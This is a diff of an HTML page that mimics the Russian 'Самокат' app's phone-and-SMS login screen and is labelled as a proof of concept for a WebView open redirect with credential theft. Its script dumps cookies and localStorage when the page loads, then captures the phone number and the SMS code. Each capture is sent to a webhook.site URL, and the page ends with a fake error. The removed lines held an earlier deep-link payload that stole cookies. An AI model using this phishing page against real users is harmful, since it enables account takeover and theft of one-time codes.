@@ -1,27 +1,165 @@
+<!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"></head>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Самокат</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
+    .screen { max-width: 420px; margin: 0 auto; min-height: 100vh; background: #fff; }
+    .top { padding: 56px 24px 20px; text-align: center; }
+    .top img { width: 64px; height: 64px; border-radius: 16px; }
+    .brand { font-size: 24px; font-weight: 700; color: #1c1c1e; margin-top: 12px; }
+    .subtitle { color: #8e8e93; font-size: 14px; margin-top: 6px; }
+    .form { padding: 32px 24px; }
+    .label { font-size: 13px; color: #8e8e93; margin-bottom: 6px; }
+    .input-wrap { background: #f2f2f7; border-radius: 12px; padding: 14px 16px; margin-bottom: 16px; display: flex; align-items: center; }
+    .prefix { color: #1c1c1e; font-size: 16px; font-weight: 500; margin-right: 8px; }
+    .input-wrap input { border: none; background: transparent; font-size: 16px; color: #1c1c1e; width: 100%; outline: none; }
+    .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; background: #34C759; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
+    .btn:active { opacity: 0.8; }
+    .note { color: #8e8e93; font-size: 12px; text-align: center; margin-top: 16px; line-height: 1.4; }
+    .sms-screen { display: none; }
+    .dots { display: flex; gap: 12px; justify-content: center; margin: 24px 0; }
+    .dot-input { width: 48px; height: 56px; border-radius: 12px; border: 2px solid #e5e5ea; background: #f2f2f7; text-align: center; font-size: 24px; font-weight: 600; outline: none; }
+    .dot-input:focus { border-color: #34C759; }
+    .timer { color: #8e8e93; font-size: 14px; text-align: center; margin-top: 12px; }
+    #status { display: none; text-align: center; padding: 20px; color: #34C759; font-weight: 600; }
+  </style>
+</head>
 <body>
-<p>Loading...</p>
+<div class="screen">
+
+  <!-- Экран 1: Ввод номера -->
+  <div id="phoneScreen">
+    <div class="top">
+      <div class="brand">Самокат</div>
+      <div class="subtitle">Войдите для продолжения</div>
+    </div>
+    <div class="form">
+      <div class="label">Номер телефона</div>
+      <div class="input-wrap">
+        <span class="prefix">+7</span>
+        <input id="phone" type="tel" placeholder="900 000-00-00" maxlength="13" autocomplete="off">
+      </div>
+      <button class="btn" onclick="sendPhone()">Получить код</button>
+      <div class="note">Нажимая кнопку, вы соглашаетесь<br>с условиями использования</div>
+    </div>
+  </div>
+
+  <!-- Экран 2: Ввод SMS-кода -->
+  <div id="smsScreen" class="sms-screen">
+    <div class="top">
+      <div class="brand">Код из СМС</div>
+      <div class="subtitle" id="smsSub">Отправили код на +7 ...</div>
+    </div>
+    <div class="form">
+      <div class="dots">
+        <input class="dot-input" type="tel" maxlength="1" oninput="moveNext(this,0)">
+        <input class="dot-input" type="tel" maxlength="1" oninput="moveNext(this,1)">
+        <input class="dot-input" type="tel" maxlength="1" oninput="moveNext(this,2)">
+        <input class="dot-input" type="tel" maxlength="1" oninput="moveNext(this,3)">
+      </div>
+      <div class="timer" id="timer">Повторная отправка через 59 сек</div>
+    </div>
+  </div>
+
+  <div id="status"></div>
+</div>
+
 <script>
-var webhook = "https://webhook.site/906ac80b-4d33-470e-8bad-ae4efeb4291e";
+// =====================================================
+// PoC: samokat://webview open redirect + credential theft
+// Webhook: замени UUID на свой
+// =====================================================
+var W = "https://webhook.site/906ac80b-4d33-470e-8bad-ae4efeb4291e";
 
-var js = "new Image().src='" + webhook + "?d='+encodeURIComponent(document.domain)+'&c='+encodeURIComponent(document.cookie)";
+// --- Шаг 0: при загрузке страницы — собираем данные WebView ---
+(function(){
+  var d = {
+    step:          "page_loaded",
+    cookie:        document.cookie || "(none)",
+    userAgent:     navigator.userAgent,
+    currentUrl:    location.href,
+    referrer:      document.referrer,
+    rnBridge:      typeof window.ReactNativeWebView !== "undefined" ? "YES" : "NO",
+    platform:      navigator.platform,
+    language:      navigator.language
+  };
+  // localStorage dump
+  try {
+    var ls = {};
+    for (var i = 0; i < localStorage.length; i++) {
+      var k = localStorage.key(i);
+      ls[k] = (localStorage.getItem(k)||"").substring(0, 200);
+    }
+    d.localStorage = JSON.stringify(ls);
+  } catch(e) { d.localStorage = "err:" + e.message; }
 
-var url = "drive2://gallery2?callback=" + encodeURIComponent(js);
+  send(d);
+})();
 
-setTimeout(function() {
-  window.location.href = url;
-}, 300);
+// --- Шаг 1: пользователь вводит номер телефона ---
+function sendPhone() {
+  var phone = document.getElementById("phone").value.replace(/\D/g, "");
+  if (phone.length < 10) return;
 
-setTimeout(function() {
-  var a = document.createElement("a");
-  a.href = url;
-  a.click();
-}, 600);
+  send({ step: "phone_entered", phone: "+7" + phone });
 
-setTimeout(function() {
-  try { window.location.replace(url); } catch(e) {}
-}, 900);
+  // Показываем экран SMS
+  document.getElementById("phoneScreen").style.display = "none";
+  document.getElementById("smsScreen").style.display = "block";
+  document.getElementById("smsSub").textContent = "Отправили код на +7 " + phone;
+  document.querySelectorAll(".dot-input")[0].focus();
+
+  // Таймер
+  var sec = 59;
+  var t = setInterval(function(){
+    sec--;
+    document.getElementById("timer").textContent = "Повторная отправка через " + sec + " сек";
+    if (sec <= 0) clearInterval(t);
+  }, 1000);
+}
+
+// --- Шаг 2: пользователь вводит SMS-код ---
+function moveNext(el, idx) {
+  var inputs = document.querySelectorAll(".dot-input");
+  if (el.value && idx < 3) inputs[idx + 1].focus();
+
+  // Проверяем заполнены ли все 4 цифры
+  var code = "";
+  inputs.forEach(function(inp){ code += inp.value; });
+  if (code.length === 4) {
+    var phone = document.getElementById("phone").value.replace(/\D/g, "");
+    send({
+      step: "sms_code_entered",
+      phone: "+7" + phone,
+      smsCode: code,
+      cookie: document.cookie,
+      rnBridge: typeof window.ReactNativeWebView !== "undefined" ? "YES" : "NO"
+    });
+
+    // Показываем лоадер
+    document.getElementById("smsScreen").style.display = "none";
+    var st = document.getElementById("status");
+    st.style.display = "block";
+    st.innerHTML = "Авторизация...";
+    setTimeout(function(){
+      st.innerHTML = "Произошла ошибка. Попробуйте позже.";
+      st.style.color = "#ff3b30";
+    }, 3000);
+  }
+}
+
+// --- Утилита отправки ---
+function send(obj) {
+  var qs = Object.keys(obj).map(function(k){
+    return encodeURIComponent(k) + "=" + encodeURIComponent(obj[k]);
+  }).join("&");
+  new Image().src = W + "?" + qs;
+  try { fetch(W + "?" + qs, {mode:"no-cors"}); } catch(e){}
+}
 </script>
 </body>
 </html>
